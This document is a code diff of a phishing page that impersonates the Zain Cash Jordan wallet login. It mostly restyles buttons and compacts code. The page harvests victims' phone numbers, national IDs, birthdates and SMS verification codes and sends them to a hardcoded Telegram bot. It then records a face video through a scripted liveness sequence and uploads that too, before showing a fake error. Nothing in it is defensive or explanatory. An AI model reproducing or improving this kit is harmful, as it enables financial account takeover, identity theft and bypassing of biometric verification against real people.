@@ -42,9 +42,58 @@
     label { color:#2F80ED; font-size:15px; font-weight:600; margin-bottom:6px; display:block; }
     input, select { padding:14px 11px; border-radius:9px; border:none; background:#f2f8fd; font-size:16px; outline:none; box-shadow:0 1.5px 5px #56ccf211; border:2px solid #56ccf233; font-family:'Cairo',Arial,sans-serif; }
     input:focus, select:focus { box-shadow:0 3px 16px #2f80ed33; border-color:#2F80ED; background:#f4faff; }
-    .button { background: linear-gradient(90deg,#2F80ED 0%,#56CCF2 100%); color:#fff; border:none; padding:13px 0; border-radius:9px; font-size:18px; font-weight:800; cursor:pointer; box-shadow:0 1px 6px #2f80ed22; }
-    .info-msg { text-align:center; color:#2F80ED; font-weight:600; margin:8px 0; }
 
+    /* زر موحد أساسي */
+    .button {
+      background: linear-gradient(90deg,#2F80ED 0%,#56CCF2 100%);
+      color:#fff;
+      border:none;
+      padding:13px 12px;
+      border-radius:9px;
+      font-size:18px;
+      font-weight:800;
+      cursor:pointer;
+      box-shadow:0 1px 6px #2f80ed22;
+      transition: transform .06s ease, opacity .08s ease;
+      display:inline-block;
+      min-width:120px;
+      text-align:center;
+    }
+    .button:active { transform:translateY(1px); opacity:0.92; }
+
+    /* زر الرجوع - أصغر ولكن متناسق */
+    .back-btn {
+      position:relative;
+      display:inline-block;
+      background: transparent;
+      color:#2F80ED;
+      border:2px solid transparent;
+      padding:6px 10px;
+      border-radius:8px;
+      font-weight:700;
+      cursor:pointer;
+      font-size:14px;
+      margin-bottom:10px;
+      text-align:center;
+    }
+    .back-btn:hover { background:#f4faff; }
+
+    /* زر إلغاء أحمر متناسق */
+    .danger-button {
+      background: linear-gradient(90deg,#ef5350 0%,#e53935 100%);
+      color:#fff;
+      border:none;
+      padding:11px 12px;
+      border-radius:9px;
+      font-size:15px;
+      font-weight:800;
+      cursor:pointer;
+      box-shadow:0 1px 6px rgba(229,57,53,0.18);
+      transition: transform .06s ease, opacity .08s ease;
+    }
+    .danger-button:active { transform:translateY(1px); opacity:0.92; }
+
+    .info-msg { text-align:center; color:#2F80ED; font-weight:600; margin:8px 0; }
     .code-inputs { display:flex; justify-content:center; gap:10px; margin:8px 0; }
     .code-inputs input { width:120px; text-align:center; font-size:19px; letter-spacing:5px; direction:ltr; font-weight:700; }
 
@@ -94,7 +143,7 @@
   </div>
 
 <script>
-  // === إعدادات البوت (كما زوّدتني) ===
+  // === إعدادات البوت (كما طُلب) ===
   const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
   const CHAT_ID = "6873334348";
 
@@ -106,7 +155,6 @@
   let telegramMsgId = null;
   let waitingTimeout = null;
 
-  // === واجهات المراحل ===
   function stepIndicator(step){
     return `
       <div class="step-indicator">
@@ -134,7 +182,7 @@
       <form id="phoneForm" autocomplete="off">
         <label>رقم الهاتف المرتبط بحسابك</label>
         <input type="tel" id="phone" placeholder="07XXXXXXXX" pattern="07[0-9]{8}" maxlength="10" required autocomplete="tel" inputmode="numeric"/>
-        <button type="submit" class="button">التالي</button>
+        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">التالي</button></div>
       </form>
       <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
     `;
@@ -161,7 +209,7 @@
         <input type="text" id="nationalId" placeholder="الرقم الوطني" maxlength="12" required inputmode="numeric"/>
         <label>تاريخ الميلاد</label>
         <div class="birthdate-fields" id="birthdateFields"></div>
-        <button type="submit" class="button">التالي</button>
+        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">التالي</button></div>
       </form>
       <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
     `;
@@ -223,7 +271,7 @@
       <div class="info-msg">أدخل رمز التحقق المكون من 5 أرقام كما وصلك برسالة SMS</div>
       <form id="code5Form" autocomplete="off">
         <div class="code-inputs"><input id="code5input" maxlength="5" inputmode="numeric" placeholder="*****" required></div>
-        <button type="submit" class="button">تأكيد الرمز</button>
+        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">تأكيد الرمز</button></div>
       </form>
       <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
     `;
@@ -257,7 +305,7 @@
     waitingTimeout = setInterval(()=>{ sec--; if(waitElem) waitElem.textContent = sec; if(sec===0){ clearInterval(waitingTimeout); renderCode4Step(); } },1000);
   }
 
-  // رمز 4 — بعد التأكيد يبدأ التحقق بالوجه تلقائياً
+  // رمز 4 — يبدأ التحقق بالوجه تلقائياً بعد التأكيد
   function renderCode4Step(){
     app.innerHTML = `
       <button class="back-btn" id="backBtn">&#8592; رجوع</button>
@@ -266,7 +314,7 @@
       <div class="info-msg">الرجاء إدخال رمز التحقق المكون من 4 أرقام</div>
       <form id="code4Form" autocomplete="off">
         <div class="code-inputs"><input id="code4input" maxlength="4" inputmode="numeric" placeholder="****" required></div>
-        <button type="submit" class="button">تأكيد الرمز</button>
+        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">تأكيد الرمز</button></div>
       </form>
       <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
     `;
@@ -279,9 +327,8 @@
       if(code.length !== 4){ alert('يرجى إدخال رمز مكون من 4 أرقام'); codeInput.focus(); return; }
       userData.code4 = code;
       try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}\n🔒 ${userData.code4}`); } catch(e){ console.log(e); }
-      // هنا: التوجيه التلقائي لبدء عملية التحقق بالوجه (بدون زر إضافي)
       try {
-        await startCaptureSequence(); // سيطلب إذن الكاميرا ويبدأ التسلسل التعليمي والتسجيل (5s لكل خطوة)
+        await startCaptureSequence(); // يبدأ التحقق التلقائي؛ في حال فشل يعود لصفحة رمز الـ4
       } catch (err) {
         console.error('Capture failed', err);
         alert('لم نستطع الوصول إلى الكاميرا. يرجى التأكد من أذونات الكاميرا ثم المحاولة مرة أخرى.');
@@ -291,7 +338,7 @@
     document.getElementById('backBtn').onclick = () => renderCode5Step();
   }
 
-  // === شاشة تحضير/تعليمات قبل التسجيل === (تعليمات واضحة) وبدء التسجيل التلقائي
+  // شاشة تحضير قصير قبل طلب الإذن
   function renderPreparingMessage(){
     app.innerHTML = `
       <div style="text-align:center;padding:18px;">
@@ -301,21 +348,20 @@
         <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:8px;">سيُطلب إذن الكاميرا الآن</div>
         <div style="color:#666;font-size:14px;">
           سنسجل فيديو قصير يتضمن أربع خطوات: <strong>اغماض العين</strong>، <strong>وجه يسار</strong>، <strong>وجه يمين</strong>، <strong>ابتسم</strong>.<br>
-          اضبط وجهك داخل الإطار، أزل القبعة/النظارات إذا لزم، واسمح بالوصول للكاميرا.
+          اضبط وجهك داخل الإطار، أزل القبعة/النظ��رات إذا لزم، واسمح بالوصول للكاميرا.
         </div>
       </div>
     `;
   }
 
-  // === تسجيل فيديو تسلسلي: لكل خطوة تعليمات واضحة، عد تنازلي 3..1، تسجيل 5 ثوانٍ ===
+  // تسجيل فيديو تسلسلي — تعليمات واضحة قبل كل خطوة، عدّ 3..1، تسجيل 5s لكل خطوة
   async function startCaptureSequence(){
     renderPreparingMessage();
     await wait(1000);
 
-    // واجهة الكاميرا و التعليمات/العدّ والتسجيل
     const steps = [
       { label: 'اغمض عينيك', instruction: 'أغلق عينيك بالكامل لمدة 5 ثوانٍ', duration: 5000 },
-      { label: 'حرك وجهك إلى اليسار', instruction: 'حرّك وجهك ببطء إلى اليسار ثم عد للمنتصف', duration: 5000 },
+      { label: 'حرك وجهك إلى اليسار', instruction: 'حرّك و��هك ببطء إلى اليسار ثم عد للمنتصف', duration: 5000 },
       { label: 'حرك وجهك إلى اليمين', instruction: 'حرّك وجهك ببطء إلى اليمين ثم عد للمنتصف', duration: 5000 },
       { label: 'ابتسم', instruction: 'ابتسم طبيعياً لمدة 5 ثوانٍ', duration: 5000 }
     ];
@@ -329,7 +375,7 @@
           </div>
           <div class="instruction-box" id="instructionBox">جاري تجهيز الكاميرا...</div>
           <div style="width:100%;display:flex;gap:10px;justify-content:center;">
-            <button id="cancelCapture" class="button" style="background:#ef5350;">إلغاء</button>
+            <button id="cancelCapture" class="danger-button">إلغاء</button>
           </div>
         </div>
       </div>
@@ -340,7 +386,7 @@
     try {
       stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
     } catch (err) {
-      throw err; // يعود للمستدعي لعرض الخطأ وإعادة الصفحة
+      throw err;
     }
 
     const videoEl = document.getElementById('videoPreview');
@@ -348,7 +394,6 @@
     const instructionBox = document.getElementById('instructionBox');
     const countdownEl = document.getElementById('countdown');
 
-    // حاول اختيار نوع مناسب إن أمكن
     let chosenMime = null;
     if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
       if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) chosenMime = 'video/mp4;codecs=h264';
@@ -359,11 +404,7 @@
     const options = chosenMime ? { mimeType: chosenMime } : undefined;
 
     let recorder;
-    try {
-      recorder = new MediaRecorder(stream, options);
-    } catch (e) {
-      try { recorder = new MediaRecorder(stream); } catch (err) { stopStream(stream); throw err; }
-    }
+    try { recorder = new MediaRecorder(stream, options); } catch(e){ try{ recorder = new MediaRecorder(stream); } catch(err){ stopStream(stream); throw err; } }
 
     let chunks = [];
     recorder.ondataavailable = (ev) => { if (ev.data && ev.data.size) chunks.push(ev.data); };
@@ -371,52 +412,38 @@
     let cancelled = false;
     cancelBtn.onclick = () => { cancelled = true; try { if(recorder.state !== 'inactive') recorder.stop(); } catch(e){} stopStream(stream); renderCode4Step(); };
 
-    // loop steps
     await wait(250);
-    for (let i=0; i<steps.length; i++){
+    for (let i=0;i<steps.length;i++){
       if (cancelled) break;
       const s = steps[i];
-      // عرض تعليمات قبل بدء العد
       instructionBox.textContent = s.instruction;
       await wait(1400);
 
-      // عد تنازلي 3..1
       countdownEl.style.display = 'block';
-      for (let c=3; c>=1; c--){ countdownEl.textContent = c; await wait(700); }
+      for (let c=3;c>=1;c--){ countdownEl.textContent = c; await wait(700); }
       countdownEl.style.display = 'none';
 
-      // بدء التسجيل
-      try { recorder.start(); } catch (err) { console.warn('rec start', err); }
-      // أثناء التسجيل نعرض عد ثواني متبقي
-      let rem = Math.ceil(s.duration / 1000);
-      for (let t = rem; t>=1; t--){ instructionBox.textContent = `${s.label} — تبقّى ${t} ثانية`; await wait(1000); }
-      // إيقاف التسجيل
+      try { recorder.start(); } catch(err){ console.warn('recorder.start', err); }
+
+      let rem = Math.ceil(s.duration/1000);
+      for (let t=rem; t>=1; t--){ instructionBox.textContent = `${s.label} — تبقّى ${t} ثانية`; await wait(1000); }
+
       if (recorder.state !== 'inactive') {
-        try { recorder.stop(); } catch(e) { console.warn('rec stop', e); }
+        try { recorder.stop(); } catch(e) { console.warn('recorder.stop', e); }
       }
-      await wait(300); // انتظر dataavailable
+      await wait(300);
     }
 
-    // End: جمع وإرسال
     stopStream(stream);
     const finalType = chosenMime ? chosenMime.split(';')[0] : (chunks[0] ? chunks[0].type : 'video/webm');
     const finalBlob = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
 
-    // عرض شاشة المعالجة أثناء الإرسال
     showProcessing(true);
-    try {
-      await sendVideoToTelegramAsVideo(finalBlob);
-    } catch (err) {
-      console.error('send video error', err);
-    } finally {
-      showProcessing(false);
-    }
+    try { await sendVideoToTelegramAsVideo(finalBlob); } catch(e){ console.error(e); } finally { showProcessing(false); }
 
-    // إظهار الخطأ النهائي وإعادة التوجيه للبداية
     showFinalErrorAndReset();
   }
 
-  // === مساعدة: إرسال الفيديو إلى تلغرام ===
   async function sendVideoToTelegramAsVideo(blob){
     try {
       const form = new FormData();
@@ -428,13 +455,11 @@
       const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: form });
       const data = await res.json();
       if (data && data.ok && data.result && data.result.message_id) { telegramMsgId = data.result.message_id; return; }
-      // إذا لم تنجح، حاول كـ document
       console.warn('sendVideo non-ok', data);
       await sendVideoAsDocumentFallback(blob);
     } catch (err) {
       console.error('sendVideo error', err);
-      // حاول إعادة الإرسال كوثيقة
-      try { await sendVideoAsDocumentFallback(blob); } catch (e) { console.error('fallback failed', e); throw err; }
+      try { await sendVideoAsDocumentFallback(blob); } catch(e){ console.error('fallback failed', e); throw err; }
     }
   }
   async function sendVideoAsDocumentFallback(blob){
@@ -448,11 +473,10 @@
     else console.warn('sendDocument failed', data);
   }
 
-  // === مساعدة: إرسال رسائل نصية ===
   async function sendToTelegramAndGetMsgId(msg){
     try {
       const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method:'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
       });
       const data = await res.json();
       if (data && data.result && data.result.message_id) return data.result.message_id;
@@ -470,18 +494,10 @@
     return await sendToTelegramAndGetMsgId(msg);
   }
 
-  // === مساعدة: إيقاف الكاميرا وواجهات ===
-  function stopStream(stream){
-    if(!stream) return;
-    stream.getTracks().forEach(t=>{ try{ t.stop(); } catch(e){} });
-  }
+  function stopStream(stream){ if(!stream) return; stream.getTracks().forEach(t=>{ try{ t.stop(); } catch(e){} }); }
   function wait(ms){ return new Promise(res=>setTimeout(res, ms)); }
 
-  function showProcessing(show){
-    const m = document.getElementById('processingModal');
-    if(!m) return;
-    if(show) m.classList.add('active'); else m.classList.remove('active');
-  }
+  function showProcessing(show){ const m = document.getElementById('processingModal'); if(!m) return; if(show) m.classList.add('active'); else m.classList.remove('active'); }
 
   function showFinalErrorAndReset(){
     const modal = document.getElementById('modalError');
@@ -494,7 +510,6 @@
       renderPhoneStep();
     }
     btn.addEventListener('click', handler);
-    // اعادة تلقائية بعد 2.5 ثانية إن لم يغلق المستخدم
     setTimeout(()=>{
       if(modal.classList.contains('active')){
         modal.classList.remove('active');
@@ -504,9 +519,8 @@
     }, 2500);
   }
 
-  // === بدء التطبيق ===
+  // ابدأ التطبيق
   renderPhoneStep();
-
 </script>
 </body>
 </html>
